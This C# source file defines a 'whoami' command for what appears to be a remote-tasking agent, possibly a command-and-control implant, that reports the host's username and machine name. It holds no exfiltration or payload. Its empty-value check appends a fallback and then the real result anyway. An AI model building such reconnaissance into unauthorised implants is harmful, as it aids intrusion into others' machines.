using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class WhoamiCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Whoami;

        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            try
            {
                string username = Environment.UserName;
                string hostname = Environment.MachineName;

                if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(hostname))
                    context.AppendResult("unknown@unknown");

                context.AppendResult($"{username}@{hostname}");
            }
            catch
            {
                context.AppendResult("unknown@unknown");
            }
        }
    }
}
